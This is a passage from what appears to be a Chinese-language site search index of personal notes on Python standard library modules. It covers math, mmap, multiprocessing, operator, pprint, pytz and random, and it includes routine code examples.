如果所有参数为零，则返回值为 0。 不带参数的 gcd() 返回 0。 3.5 新版功能. 在 3.9 版更改: 添加了对任意数量的参数的支持。 之前的版本只支持两个参数。 math.isclose(a, b, *, rel_tol=1e-09, abs_tol=0.0) 若 a 和 b 的值比较接近则返回 True，否则返回 False。 根据给定的绝对和相对容差确定两个值是否被认为是接近的。 rel_tol 是相对容差 —— 它是 a 和 b 之间允许的最大差值，相对于 a 或 b 的较大绝对值。例如，要设置5％的容差，请传递 rel_tol=0.05 。默认容差为 1e-09，确保两个值在大约9位十进制数字内相同。 rel_tol 必须大于零。 abs_tol 是最小绝对容差 —— 对于接近零的比较很有用。 abs_tol 必须至少为零。 如果没有错误发生，结果将是： abs(a-b) <= max(rel_tol * max(abs(a), abs(b)), abs_tol) 。 IEEE 754特殊值 NaN ， inf 和 -inf 将根据IEEE规则处理。具体来说， NaN 不被认为接近任何其他值，包括 NaN 。 inf 和 -inf 只被认为接近自己。 3.5 新版功能. 参见 PEP 485 —— 用于测试近似相等的函数 math.isfinite(x) 如果 x 既不是无穷大也不是NaN，则返回 True ，否则返回 False 。 （注意 0.0 被认为 是 有限的。） 3.2 新版功能. math.isinf(x) 如果 x 是正或负无穷大，则返回 True ，否则返回 False 。 math.isnan(x) 如果 x 是 NaN（不是数字），则返回 True ，否则返回 False 。 math.isqrt(n) 返回非负整数 n 的整数平方根。 这就是对 n 的实际平方根向下取整，或者相当于使得 a² ≤ n 的最大整数 a。 对于某些应用来说，可以更适合取值为使得 n ≤ a² 的最小整数 a ，或者换句话说就是 n 的实际平方根向上取整。\n对于正数 n，这可以使用 a = 1 + isqrt(n - 1) 来计算。 3.8 新版功能. math.lcm(*integers) 返回给定的整数参数的最小公倍数。 如果所有参数均非零，则返回值将是为所有参数的整数倍的最小正整数。 如果参数之一为零，则返回值为 0。 不带参数的 lcm() 返回 1。 3.9 新版功能. math.ldexp(x, i) 返回 x * (2**i) 。 这基本上是函数 frexp() 的反函数。 math.modf(x) 返回 x 的小数和整数部分。两个结果都带有 x 的符号并且是浮点数。 math.nextafter(x, y) 返回 x 趋向于 y 的最接近的浮点数值。 如果 x 等于 y 则返回 y。 示例: math.nextafter(x, math.inf) 的方向朝上：趋向于正无穷。\nmath.nextafter(x, -math.inf) 的方向朝下：趋向于负无穷。\nmath.nextafter(x, 0.0) 趋向于零。\nmath.nextafter(x, math.copysign(math.inf, x)) 趋向于零的反方向。 另请参阅 math.ulp()。 3.9 新版功能. math.perm(n, k=None) 返回不重复且有顺序地从 n 项中选择 k 项的方式总数。 当 k <= n 时取值为 n! / (n - k)!；当 k > n 时取值为零。 如果 k 未指定或为 None，则 k 默认值为 n 并且函数将返回 n!。 如果任一参数不为整数则会引发 TypeError。 如果任一参数为负数则会引发 ValueError。 3.8 新版功能. math.prod(iterable, *, start=1) 计算输入的 iterable 中所有元素的积。 积的默认 start 值为 1。 当可迭代对象为空时，返回起始值。 此函数特别针对数字值使用，并会拒绝非数字类型。 3.8 新版功能. math.remainder(x, y) 返回 IEEE 754 风格的 x 相对于 y 的余数。对于有限 x 和有限非零 y ，这是差异 x - n*y ，其中 n 是与商 x / y 的精确值最接近的整数。\n如果 x / y 恰好位于两个连续整数之间，则将最接近的 偶数 用作 n 。 余数 r = remainder(x, y) 因此总是满足 abs(r) <= 0.5 * abs(y)。 特殊情况遵循IEEE 754：特别是 remainder(x, math.inf) 对于任何有限 x 都是 x ，\n而 remainder(x, 0) 和 remainder(math.inf, x) 引发 ValueError 适用于任何非NaN的 x 。\n如果余数运算的结果为零，则该零将具有与 x 相同的符号。 在使用IEEE 754二进制浮点的平台上，此操作的结果始终可以完全表示：不会引入舍入错误。 3.7 新版功能. math.trunc(x) 返回去除小数部分的 x ，只留下整数部分。\n这样就可以四舍五入到0了： trunc() 对于正的 x 相当于 floor() ，对于负的 x 相当于 ceil() 。\n如果 x 不是浮点数，委托给 x.__trunc__ ，它应该返回一个 Integral 值。 math.ulp(x) 返回浮点数 x 的最小有效比特位的值: 如果 x 是 NaN (非数字)，则返回 x。\n如果 x 为负数，则返回 ulp(-x)。\n如果 x 为正数，则返回 x。\n如果 x 等于零，则返回 去正规化的 可表示最小正浮点数 (小于 正规化的 最小正浮点数 sys.float_info.min)。\n如果 x 等于可表示最大正浮点数，则返回 x 的最低有效比特位的值，使得小于 x 的第一个浮点数为 x - ulp(x)。\n在其他情况下 (x 是一个有限的正数)，则返回 x 的最低有效比特位的值，使得大于 x 的第一个浮点数为 x + ulp(x)。\nULP 即 \"Unit in the Last Place\" 的缩写。 另请参阅 math.nextafter() 和 sys.float_info.epsilon。 3.9 新版功能. 注意 frexp() 和 modf() 具有与它们的C等价函数不同的调用/返回模式：\n它们采用单个参数并返回一对值，而不是通过 '输出形参' 返回它们的第二个返回参数（Python中没有这样的东西）。 对于 ceil() ， floor() 和 modf() 函数，请注意 所有 足够大的浮点数都是精确整数。\nPython浮点数通常不超过53位的精度（与平台C double类型相同），在这种情况下，任何浮点 x 与 abs(x) >= 2**52 必然没有小数位。 幂函数与对数函数 math.cbrt(x) Return the cube root of x. 3.11 新版功能. math.exp(x) 返回 e 次 x 幂，其中 e = 2.718281... 是自然对数的基数。这通常比 math.e ** x 或 pow(math.e, x) 更精确。 math.exp2(x) Return 2 raised to the power x. 3.11 新版功能. math.expm1(x) 返回 e 的 x 次幂，减1。这里 e 是自然对数的基数。\n对于小浮点数 x ， exp(x) - 1 中的减法可能导致 significant loss of precision；\nexpm1() 函数提供了一种将此数量计算为全精度的方法: from math import exp, expm1\nexp(1e-5) - 1  # gives result accurate to 11 places\n1.0000050000069649e-05\nexpm1(1e-5)    # result accurate to full precision\n1.0000050000166668e-05 3.2 新版功能. math.log(x[, base]) 使用一个参数，返回 x 的自然对数（底为 e ）。 使用两个参数，返回给定的 base 的对数 x ，计算为 log(x)/log(base) 。 math.log1p(x) 返回 1+x 的自然对数（以 e 为底）。 以对于接近零的 x 精确的方式计算结果。 math.log2(x) 返回 x 以2为底的对数。这通常比 log(x, 2) 更准确。 3.3 新版功能. 参见 int.bit_length() 返回表示二进制整数所需的位数，不包括符号和前导零。 math.log10(x) 返回 x 底为10的对数。这通常比 log(x, 10) 更准确。 math.pow(x, y) Return x raised to the power y. Exceptional cases follow the IEEE 754 standard as far as possible. In particular, pow(1.0, x) and pow(x, 0.0) always return 1.0, even when x is a zero or a NaN. If both x and y are finite, x is negative, and y is not an integer then pow(x, y) is undefined, and raises ValueError. 与内置的 ** 运算符不同， math.pow() 将其参数转换为 float 类型。使用 ** 或内置的 pow() 函数来计算精确的整数幂。 在 3.11 版更改: The special cases pow(0.0, -inf) and pow(-0.0, -inf) were changed to return inf instead of raising ValueError, for consistency with IEEE 754. math.sqrt(x) 返回 x 的平方根。 三角函数 math.acos(x) 返回以弧度为单位的 x 的反余弦值。 结果范围在 0 到 pi 之间。 math.asin(x) 返回以弧度为单位的 x 的反正弦值。 结果范围在 -pi/2 到 pi/2 之间。 math.atan(x) 返回以弧度为单位的 x 的反正切值。 结果范围在 -pi/2 到 pi/2 之间。. math.atan2(y, x) 以弧度为单位返回 atan(y / x) 。结果是在 -pi 和 pi 之间。从原点到点 (x, y) 的平面矢量使该角度与正X轴成正比。 atan2() 的点的两个输入的符号都是已知的，因此它可以计算角度的正确象限。 例如， atan(1) 和 atan2(1, 1) 都是 pi/4 ，但 atan2(-1, -1) 是 -3*pi/4 。 math.cos(x) 返回 x 弧度的余弦值。 math.dist(p, q) 返回 p 与 q 两点之间的欧几里得距离，以一个坐标序列（或可迭代对象）的形式给出。 两个点必须具有相同的维度。 大致相当于: sqrt(sum((px - qx) ** 2.0 for px, qx in zip(p, q))) 3.8 新版功能. math.hypot(*coordinates) 返回欧几里得范数，sqrt(sum(x**2 for x in coordinates))。 这是从原点到坐标给定点的向量长度。 对于一个二维点 (x, y)，这等价于使用毕达哥拉斯定义 sqrt(x*x + y*y) 计算一个直角三角形的斜边。 在 3.8 版更改: 添加了对 n 维点的支持。 之前的版本只支持二维点。 在 3.10 版更改: 改进了算法的精确性，使得最大误差在 1 ulp (最后一位的单位数值) 以下。 更为常见的情况是，结果几乎总是能正确地舍入到 1/2 ulp 范围之内。 math.sin(x) 返回 x 弧度的正弦值。 math.tan(x) 返回 x 弧度的正切值。 角度转换 math.degrees(x) 将角度 x 从弧度转换为度数。 math.radians(x) 将角度 x 从度数转换为弧度。 双曲函数 双曲函数 是基于双曲线而非圆来对三角函数进行模拟。 math.acosh(x) 返回 x 的反双曲余弦值。 math.asinh(x) 返回 x 的反双曲正弦值。 math.atanh(x) 返回 x 的反双曲正切值。 math.cosh(x) 返回 x 的双曲余弦值。 math.sinh(x) 返回 x 的双曲正弦值。 math.tanh(x) 返回 x 的双曲正切值。 特殊函数 math.erf(x) 返回 x 处的 error function 。 The erf() function can be used to compute traditional statistical functions such as the cumulative standard normal distribution: def phi(x):\n    'Cumulative distribution function for the standard normal distribution'\n    return (1.0 + erf(x / sqrt(2.0))) / 2.0 3.2 新版功能. math.erfc(x) 返回 x 处的互补误差函数。 互补错误函数 定义为 1.0 - erf(x)。 它用于 x 的大值，从其中减去一个会导致 有效位数损失。 3.2 新版功能. math.gamma(x) 返回 x 处的 伽马函数 值。 3.2 新版功能. math.lgamma(x) 返回Gamma函数在 x 绝对值的自然对数。 3.2 新版功能. 常量 math.pi: 数学常数 π = 3.141592...，精确到可用精度。 math.e: 数学常数 e = 2.718281...，精确到可用精度。 math.tau: 数学常数 τ = 6.283185...，精确到可用精度。\nTau 是一个圆周常数，等于 2π，圆的周长与半径之比。\n更多关于 Tau 的信息可参考 Vi Hart 的视频 Pi is (still) Wrong。吃两倍多的派来庆祝 Tau 日 吧！ 3.6 新版功能. math.inf: 浮点正无穷大。 （对于负无穷大，使用 -math.inf 。）相当于 float('inf') 的输出。 3.5 新版功能. math.nan: 一个浮点的 \"非数字\"（NaN）值。相当于 float('nan') 的输出。\n由于 IEEE-754标准 的要求， math.nan 和 float('nan') 不被认为等于任何其他数值，包括其本身。\n要检查一个数字是否为NaN，请使用 isnan() 函数来测试 NaN ，而不是 is 或 == 。 例子: >>>\nimport math\nmath.nan == math.nan\nFalse\nfloat('nan') == float('nan')\nFalse\nmath.isnan(math.nan)\nTrue\nmath.isnan(float('nan'))\nTrue 在 3.11 版更改: It is now always available. 3.5 新版功能. CPython 实现细节 math 模块主要包含围绕平台C数学库函数的简单包装器。\n特殊情况下的行为在适当情况下遵循C99标准的附录F。\n当前的实现将引发 ValueError 用于无效操作，如 sqrt(-1.0) 或 log(0.0) （其中C99附件F建议发出无效操作信号或被零除），\n和 OverflowError 用于溢出的结果（例如， exp(1000.0) ）。\n除非一个或多个输入参数是NaN，否则不会从上述任何函数返回NaN；\n在这种情况下，大多数函数将返回一个NaN，但是（再次遵循C99附件F）这个规则有一些例外，\n例如 pow(float('nan'), 0.0) 或 hypot(float('nan'), float('inf')) 。 请注意，Python不会将显式NaN与静默NaN区分开来，并且显式NaN的行为仍未明确。典型的行为是将所有NaN视为静默的。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-math.html","loc":"/yq-docs-rear-end-python-python-standard-library-math.html"},{"title":"mmap","text":"官网文档:: mmap - 内存映射文件支持 部分参考:: Python多进程（2）——mmap模块与mmap对象 创建内存映射的文件对象. 类似于file打开的文件对象的操作, 同时又支持了字节数组的一些操作如切片. 通俗来说就是创建一个存在于内存的文件(个人观点). 与 string 的区别是: mmap 对象不提供字符串对象的方法； mmap 对象是可变的, 而 str 对象是不可变的 mmap 对象同时对应于打开的文件, 多态于一个Python file 对象 mmap 对象可以切片和索引, 也可以为它的切片或索引赋值（因为 mmap 对象是可变的）,\n为 mmap 对象的切片赋值时, 赋值语句右值的长度必须和左值切片的长度相同.\nmmap 对象可以作为进程间通过文件进行 IPC 的一种替换手段. mmap类 定义 windows版本 unix版本 参数 fileno: 文件描述符(句柄), 可以是 -1 这种, 也可以 open().fileno() length: int 将指定 fileno 的前 length 字节映射到内存.\n映射的内容字节长度, 为0则表示映射整个文件. 如果 length 大于当前文件大小, 则文件将扩展为包含 length 个字节. 如果 length 为 0, 则映射的最大长度为当前文件大小. 如果文件为空,  Windows 会引发异常（你无法在Windows上创建空映射）. tagname=None platform: windows . 如果 tagname 被指定且不是 None , 则是为映射提供标签名称的字符串(为一段内存映射指定名称).\nWindows 允许你对同一文件拥有许多不同的映射(一个文件上面可以同时具有多个 mmap). 如果指定现有标签的名称, 则会打开该标签, 否则将创建该名称的新标签. 如果省略此参数或设置为 None , 则创建的映射不带名称. 避免使用 tag 参数将有助于使代码在Unix和Windows之间可移植. flags=MAP_SHARED platform: unix . flags 指明映射的性质. MAP_PRIVATE 会创建私有的写入时拷贝映射, 因此对 mmap 对象内容的修改将为该进程所私有. MAP_SHARED 会创建与其他映射同一文件区域的进程所共享的映射.  默认值为 MAP_SHARED. prot=PROT_WRITE|PROT_READ platform: unix . 如果指明了 prot, 它将给出所需的内存保护方式；\n最有用的两个值是 PROT_READ 和 PROT_WRITE,\n分别指明页面为可读或可写. prot 默认为 PROT_READ | PROT_WRITE (可读可写). access=ACCESS_DEFAULT[, offset]) 在unix下, 可以指定 access 作为替代 flags 和 prot 的可选关键字形参.\n同时指定 flags, prot 和 access 将导致错误. 对于所有平台: 可以将 access 指定为可选的关键字参数.  access 接受以下四个值之一: ACCESS_READ 指定只读. 向 ACCESS_READ 内存映射赋值会引发 TypeError 异常. ACCESS_WRITE 指定只写. 向 ACCESS_WRITE 内存映射赋值会影响内存和底层的文件. ACCESS_COPY 指定写时复制内存. 向 ACCESS_COPY 内存映射赋值会影响内存, 但不会更新底层的文件. ACCESS_DEFAULT 推迟到 prot access 可以在 Unix 和 Windows 上使用. 如果未指定 access , 则 Windows mmap 返回只写映射.\n这三种访问类型的初始内存值均取自指定的文件. offset 可以被指定为非负整数偏移量.  mmap 引用将相对于从文件开头的偏移. offset 默认为0.  offeset 必须是 ALLOCATIONGRANULARITY 的倍数. 注意: 创建 mmap 将会引发一个 审计事件 mmap.__new__ 附带参数 fileno, length, access, offset. mmap 对象的方法 close() 关闭 mmap。 后续调用该对象的其他方法将导致引发 ValueError 异常。 此方法将不会关闭打开的文件。 closed 如果文件已关闭则返回 True。 find(sub[, start[, end]]) 返回子序列 sub 在对象内被找到的最小索引号，使得 sub 被包含在 [start, end] 范围中。 可选参数 start 和 end 会被解读为切片表示法。 如果未找到则返回 -1。 在 3.5 版更改: 现在接受可写的 字节类对象。 flush([offset[, size]]) 将对文件的内存副本的修改刷新至磁盘。 如果不使用此调用则无法保证在对象被销毁前将修改写回存储。 如果指定了 offset 和 size，则只将对指定范围内字节的修改刷新至磁盘；在其他情况下，映射的全部范围都会被刷新。 offset 必须为 PAGESIZE 或 ALLOCATIONGRANULARITY 的倍数。 返回 None 以表示成功。 当调用失败时将引发异常。 在 3.8 版更改: 在之前版本中，成功时将返回非零值；在 Windows 下当发生错误时将返回零。 在 Unix 下 成功时将返回零值；当发生错误时将引发异常。 madvise(option[, start[, length]]) 将有关内存区域的建议 option 发送至内核，从 start 开始扩展 length 个字节。 option 必须为系统中可用的 MADV_* 常量 之一。 如果省略 start 和 length，则会包含整个映射。 在某些系统中（包括 Linux），start 必须为 PAGESIZE 的倍数。 可用性: 具有 madvise() 系统调用的系统。 3.8 新版功能. move(dest, src, count) 将从偏移量 src 开始的 count 个字节拷贝到目标索引号 dest。 如果 mmap 创建时设置了 ACCESS_READ，则调用 move 将引发 TypeError 异常。 read([n]) 返回一个 bytes，其中包含从当前文件位置开始的至多 n 个字节。 如果参数省略，为 None 或负数，则返回从当前文件位置开始直至映射结尾的所有字节。 文件位置会被更新为返回字节数据之后的位置。 在 3.3 版更改: 参数可被省略或为 None。 read_byte() 将当前文件位置上的一个字节以整数形式返回，并让文件位置前进 1。 readline() 返回一个单独的行，从当前文件位置开始直到下一个换行符。 文件位置会被更新为返回字节数据之后的位置。 resize(newsize) 改变映射以及下层文件的大小，如果存在的话。 如果 mmap 创建时设置了 ACCESS_READ 或 ACCESS_COPY，则改变映射大小将引发 TypeError 异常。 On Windows: Resizing the map will raise an OSError if there are other maps against the same named file. Resizing an anonymous map (ie against the pagefile) will silently create a new map with the original data copied over up to the length of the new size. 在 3.11 版更改: Correctly fails if attempting to resize when another map is held Allows resize against an anonymous map on Windows rfind(sub[, start[, end]]) 返回子序列 sub 在对象内被找到的最大索引号，使得 sub 被包含在 [start, end] 范围中。 可选参数 start 和 end 会被解读为切片表示法。 如果未找到则返回 -1。 在 3.5 版更改: 现在接受可写的 字节类对象。 seek(pos[, whence]) 设置文件的当前位置。 whence 参数为可选项并且默认为 os.SEEK_SET 或 0 (绝对文件定位)；其他值还有 os.SEEK_CUR 或 1 (相对当前位置查找) 和 os.SEEK_END 或 2 (相对文件末尾查找)。 size() 返回文件的长度，该数值可以大于内存映射区域的大小。 tell() 返回文件指针的当前位置。 write(bytes) 将 bytes 中的字节数据写入文件指针当前位置的内存并返回写入的字节总数 (一定不小于 len(bytes)，因为如果写入失败，将会引发 ValueError)。 在字节数据被写入后文件位置将会更新。 如果 mmap 创建时设置了 ACCESS_READ，则向其写入将引发 TypeError 异常。 在 3.5 版更改: 现在接受可写的 字节类对象。 在 3.6 版更改: 现在会返回写入的字节总数。 write_byte(byte) 将整数值 byte 写入文件指针当前位置的内存；文件位置前进 1。 如果 mmap 创建时设置了 ACCESS_READ，则向其写入将引发 TypeError 异常。 对于EOF的处理, write() 和 read_byte() 抛出异常 ValueError, 而 write_byte() 和 read() 什么都不做.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-mmap.html","loc":"/yq-docs-rear-end-python-python-standard-library-mmap.html"},{"title":"multiprocessing","text":"官网文档:: multiprocessing Python中多进程是相互执行互不干扰的，但是如果多进程之间需要对同一资源对象进行操作或者多个进程之间有相互依赖的，\n那就需要一个共享变量供多进程使用。 Python multiprocessing 多进程之间相互协调的方式有如下几种: Lock: 锁 Queue: 队列 Semaphore: 信号量 Event: 事件 Pipe: 管道 Process Process(self, group=None, target=None, name=None, args=(), kwargs={}, *, daemon=None) 开启一个新的进程, 仅介绍常用的几个 target=None 子进程执行的代码, 一般是一个函数 args: tuple = () target传递的函数, 需要用的参数列表 kwargs: dict = {} target传递的函数, 需要用的关键字参数字典 daemon=None bool, 是否设置为守护线程. 详细见: daemon 支持三种启动进程的方法 spawn 父进程启动一个新的Python解释器进程。\n子进程将只继承运行Process对象的run()方法所需的资源。\n不会继承来自父进程的不必要的文件描述符和句柄。与使用fork或forkserver相比，使用此方法启动进程相当慢。 可在 Unix 和 Windows 上使用。 Windows 和 macOS 上的默认设置。 fork 父进程使用 os.fork() 来产生 Python 解释器分叉。子进程在开始时实际上与父进程相同。父进程的所有资源都由子进程继承。请注意，安全分叉多线程进程是棘手的。 只存在于 Unix。 Unix 中的默认值。 forkserver 程序启动并选择 forkserver 启动方法时，将启动服务器进程。 从那时起，每当需要一个新进程时，父进程就会连接到服务器并请求它分叉一个新进程。 分叉服务器进程是单线程的，因此使用 os.fork() 是安全的。 没有不必要的资源被继承。 可在Unix平台上使用，支持通过Unix管道传递文件描述符。 如要更改, 在执行之前使用: import multiprocessing as mp\n\nmp.set_start_method('spawn') 进程之间交换对象 multiprocessing 支持进程之间的两种通信通道： 队列 管道 队列 Queue 类是一个近似 queue.Queue 的克隆。 例如: from multiprocessing import Process, Queue\n\ndef f(q):\n    q.put([42, None, 'hello'])\n\nif __name__ == '__main__':\n    q = Queue()\n    p = Process(target=f, args=(q,))\n    p.start()\n    print(q.get())    # prints \"[42, None, 'hello']\"\n    p.join() 队列是线程和进程安全的。 管道 Pipe() 函数返回一个由管道连接的连接对象，默认情况下是双工（双向）。例如: from multiprocessing import Process, Pipe\n\ndef f(conn):\n    conn.send([42, None, 'hello'])\n    conn.close()\n\nif __name__ == '__main__':\n    parent_conn, child_conn = Pipe()\n    p = Process(target=f, args=(child_conn,))\n    p.start()\n    print(parent_conn.recv())   # prints \"[42, None, 'hello']\"\n    p.join() 返回的两个连接对象 Pipe() 表示管道的两端。每个连接对象都有 send() 和 recv() 方法（相互之间的）。请注意，如果两个进程（或线程）同时尝试读取或写入管道的 同一 端，则管道中的数据可能会损坏。当然，在不同进程中同时使用管道的不同端的情况下不存在损坏的风险。 进程间同步 multiprocessing 包含来自 threading 的所有同步原语的等价物。例如，可以使用锁来确保一次只有一个进程打印到标准输出: from multiprocessing import Process, Lock\n\ndef f(l, i):\n    l.acquire()\n    try:\n        print('hello world', i)\n    finally:\n        l.release()\n\nif __name__ == '__main__':\n    lock = Lock()\n\n    for num in range(10):\n        Process(target=f, args=(lock, num)).start() 不使用锁的情况下，来自于多进程的输出很容易产生混淆。 进程间共享状态 如上所述，在进行并发编程时，通常最好尽量避免使用共享状态。使用多个进程时尤其如此。 但是，如果你真的需要使用一些共享数据，那么 multiprocessing 提供了两种方法。 共享内存 可以使用 Value 或 Array 将数据存储在共享内存映射中。例如，以下代码: from multiprocessing import Process, Value, Array\n\ndef f(n, a):\n    n.value = 3.1415927\n    for i in range(len(a)):\n        a[i] = -a[i]\n\nif __name__ == '__main__':\n    num = Value('d', 0.0)\n    arr = Array('i', range(10))\n\n    p = Process(target=f, args=(num, arr))\n    p.start()\n    p.join()\n\n    print(num.value)\n    print(arr[:]) 将打印: 3.1415927\n[0, -1, -2, -3, -4, -5, -6, -7, -8, -9] 创建 num 和 arr 时使用的 'd' 和 'i' 参数是 array 模块使用的类型的 typecode ： 'd' 表示双精度浮点数， 'i' 表示有符号整数。这些共享对象将是进程和线程安全的。 为了更灵活地使用共享内存，可以使用 multiprocessing.sharedctypes 模块，该模块支持创建从共享内存分配的任意ctypes对象。 服务进程 由 Manager() 返回的管理器对象控制一个服务进程，该进程保存Python对象并允许其他进程使用代理操作它们。 Manager() 返回的管理器支持类型: list dict Namespace Lock RLock Semaphore BoundedSemaphore Condition Event Barrier Queue Value Array 例如: from multiprocessing import Process, Manager\n\ndef f(d, l):\n    d[1] = '1'\n    d['2'] = 2\n    d[0.25] = None\n    l.reverse()\n\nif __name__ == '__main__':\n    with Manager() as manager:\n        d = manager.dict()\n        l = manager.list(range(10))\n\n        p = Process(target=f, args=(d, l))\n        p.start()\n        p.join()\n\n        print(d)\n        print(l) 将打印: {0.25: None, 1: '1', '2': 2}\n[9, 8, 7, 6, 5, 4, 3, 2, 1, 0] 使用服务进程的管理器比使用共享内存对象更灵活，因为它们可以支持任意对象类型。\n此外，单个管理器可以通过网络由不同计算机上的进程共享。但是，它们比使用共享内存慢。 使用工作进程 Process对象的一些属性/方法 start() 启动进程活动。 这个方法每个进程对象最多只能调用一次。它会将对象的 run() 方法安排在一个单独的进程中调用。 join([timeout]) 如果可选参数 timeout 是 None （默认值），则该方法将阻塞，直到调用 join() 方法的进程终止。如果 timeout 是一个正数，它最多会阻塞 timeout 秒。请注意，如果进程终止或方法超时，则该方法返回 None 。检查进程的 exitcode 以确定它是否终止。 一个进程可以被 join 多次。 进程无法join自身，因为这会导致死锁。尝试在启动进程之前join进程是错误的。 name 进程的名称。该名称是一个字符串，仅用于识别目的。它没有语义。可以为多个进程指定相同的名称。 初始名称由构造器设定。 如果没有为构造器提供显式名称，则会构造一个形式为 'Process-N1:N2:...:Nk' 的名称，其中每个 Nk 是其父亲的第 N 个孩子。 is_alive() 返回进程是否还活着。 粗略地说，从 start() 方法返回到子进程终止之前，进程对象仍处于活动状态。 daemon 进程的守护标志，一个布尔值。这必须在 start() 被调用之前设置。 初始值继承自创建进程。 当进程退出时，它会尝试终止其所有守护进程子进程。 请注意，不允许在守护进程中创建子进程。这是因为当守护进程由于父进程退出而中断时，其子进程会变成孤儿进程。\n另外，这些 不是 Unix 守护进程或服务，它们是正常进程，如果非守护进程已经退出，它们将被终止（并且不被合并）。 pid 返回进程ID。在生成该进程之前，这将是 None 。 exitcode 子进程的退出代码。如果该进程尚未终止则为 None 。 如果子进程的 run() 方法正常返回，退出代码将是 0 。 如果它通过 sys.exit() 终止，并有一个整数参数 N ，退出代码将是 N 。 如果子进程由于在 run() 内的未捕获异常而终止，退出代码将是 1 。 如果它是由信号 N 终止的，退出代码将是负值 -N 。 sentinel 系统对象的数字句柄，当进程结束时将变为 \"ready\" 。 如果要使用 multiprocessing.connection.wait() 一次等待多个事件，可以使用此值。否则调用 join() 更简单。 在Windows上，这是一个操作系统句柄，可以与 WaitForSingleObject 和 WaitForMultipleObjects 系列API调用一起使用。在Unix上，这是一个文件描述符，可以使用来自 select 模块的原语。 3.3 新版功能. terminate() 终止进程。 在Unix上，这是使用 SIGTERM 信号完成的；在Windows上使用 TerminateProcess() 。 请注意，不会执行退出处理程序和finally子句等。 请注意，进程的后代进程将不会被终止 —— 它们将简单地变成孤立的。 警告 如果在关联进程使用管道或队列时使用此方法，则管道或队列可能会损坏，并可能无法被其他进程使用。\n类似地，如果进程已获得锁或信号量等，则终止它可能导致其他进程死锁。 kill() 与 terminate() 相同，但在Unix上使用 SIGKILL 信号。 close() 关闭 Process 对象，释放与之关联的所有资源。如果底层进程仍在运行，则会引发 ValueError 。一旦 close() 成功返回， Process 对象的大多数其他方法和属性将引发 ValueError 。 注解 注意 start() 、 join() 、 is_alive() 、 terminate() 和 exitcode 方法只能由创建进程对象的进程调用。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-multiprocessing.html","loc":"/yq-docs-rear-end-python-python-standard-library-multiprocessing.html"},{"title":"operator","text":"两个便捷使用的操作: import operator\noperator.itemgetter\n<class 'operator.itemgetter'>\noperator.attrgetter\n<class 'operator.attrgetter'> itemgetter, 便捷获取字典属性 attrgetter, 便捷获取对象属性 itemgetter 有一个字典列表，你想根据某个或某几个字典字段来排序这个列表: rows = [\n    {'fname': 'Brian', 'lname': 'Jones', 'uid': 1003},\n    {'fname': 'David', 'lname': 'Beazley', 'uid': 1002},\n    {'fname': 'John', 'lname': 'Cleese', 'uid': 1001},\n    {'fname': 'Big', 'lname': 'Jones', 'uid': 1004}\n]\n\nfrom operator import itemgetter\n\nrows_by_fname = sorted(rows, key=itemgetter('fname'))\nrows_by_uid = sorted(rows, key=itemgetter('uid')) 也支持多个 keys，比如下面的代码: rows_by_lfname = sorted(rows, key=itemgetter('lname','fname')) print(rows_by_lfname) 也可以用 lambda 表达式代替，比如: rows_by_fname = sorted(rows, key=lambda r: r['fname'])\nrows_by_lfname = sorted(rows, key=lambda r: (r['lname'],r['fname'])) 但是效率较低 attrgetter 与上类似. 支持的是自定义对象 总览 部分总览: operator.lt(a, b)\noperator.le(a, b)\noperator.eq(a, b)\noperator.ne(a, b)\noperator.ge(a, b)\noperator.gt(a, b)\noperator.__lt__(a, b)\noperator.__le__(a, b)\noperator.__eq__(a, b)\noperator.__ne__(a, b)\noperator.__ge__(a, b)\noperator.__gt__(a, b)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-operator.html","loc":"/yq-docs-rear-end-python-python-standard-library-operator.html"},{"title":"pprint","text":"pprint --- 数据美化输出 官网: https://docs.python.org/zh-cn/3/library/pprint.html 针对 json 格式数据的美化打印工具 pprint 模块提供了\"美化打印\"任意 Python 数据结构的功能，这种美化形式可用作对解释器的输入。\n如果经格式化的结构包含非基本 Python 类型的对象，则其美化形式可能无法被加载。\n包含文件、套接字或类对象，以及许多其他不能用 Python 字面值来表示的对象都有可能导致这样的结果。 PrettyPrinter class pprint.PrettyPrinter(indent=1, width=80, depth=None, stream=None, *, compact=False, sort_dicts=True, underscore_numbers=False) 构造一个 PrettyPrinter 实例。 这个构造器支持一些关键字形参。 stream: 默认使用 sys.stdout, 类文件对象, 后面会调用其 write() 方法.\n如果 stream and sys.stdout 都为空, 则没有输出. indent = 1 指定缩进 depth: 打印多少层, 默认无限制 width =  80 指定输出中每行所允许的最大字符数。\n如果一个数据结构无法在宽度限制之内被格式化，将显示尽可能多的内容。 compact: 影响长序列（列表、元组、集合等等）的格式化方式。 如果 compact 为假值（默认）则序列的每一项将格式化为单独的行。 如果 compact 为真值，则每个输出行格式化时将在 width 的限制之内尽可能地容纳多个条目。 sort_dicts = True 字典在格式化时将基于键进行排序，否则它们将按插入顺序显示。 underscore_numbers = True 整数在格式化时将使用 _ 字符作为千位分隔符，否则不显示下划线（默认）。 在 3.4 版更改: 增加了 compact 形参。 在 3.8 版更改: 增加了 sort_dicts 形参。 在 3.10 版更改: 添加了 underscore_numbers 形参。 在 3.11 版更改: No longer attempts to write to sys.stdout if it is None. pprint.pprint(object, stream=None, indent=1, width=80, depth=None, *, compact=False, sort_dicts=True, underscore_numbers=False) 打印格式化的对象/流描述信息. 若 stream=None, 使用 sys.stdout. 可以使用 print = pprint.pprint 来替换默认行为. 实际就是构造 PrettyPrinter 例: import pprint\nstuff = ['spam', 'eggs', 'lumberjack', 'knights', 'ni']\nstuff.insert(0, stuff)\npprint.pprint(stuff)\n\n[<Recursion on list with id=...>,\n'spam',\n'eggs',\n'lumberjack',\n'knights',\n'ni']","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-pprint.html","loc":"/yq-docs-rear-end-python-python-standard-library-pprint.html"},{"title":"pytz","text":"时区操作的库","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-pytz.html","loc":"/yq-docs-rear-end-python-python-standard-library-pytz.html"},{"title":"random","text":"官网: https://docs.python.org/zh-cn/3/library/random.html 生成伪随机数 该模块实现了各种分布的伪随机数生成器。 对于整数，从范围中有统一的选择。 对于序列，存在随机元素的统一选择、用于生成列表的随机排列的函数、以及用于随机抽样而无需替换的函数。 在实数轴上，有计算均匀、正态（高斯）、对数正态、负指数、伽马和贝塔分布的函数。 为了生成角度分布，可以使用 von Mises 分布。 这个模块提供的函数实际上是 random.Random 